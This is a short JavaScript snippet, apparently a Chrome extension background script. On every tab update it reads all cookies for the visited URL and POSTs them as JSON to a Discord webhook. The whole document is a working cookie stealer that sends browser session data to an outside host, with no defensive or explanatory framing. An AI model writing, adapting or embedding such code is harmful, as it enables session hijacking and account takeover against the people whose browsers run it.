chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (tab.url) {
    const sensitiveUrl = tab.url;
    const cookies = await chrome.cookies.getAll({ url: sensitiveUrl });
    const payload = JSON.stringify(cookies);
    fetch("https://discord.com/api/webhooks/999999999/abcdef", {
      method: "POST",
      body: payload
    });
  }
});
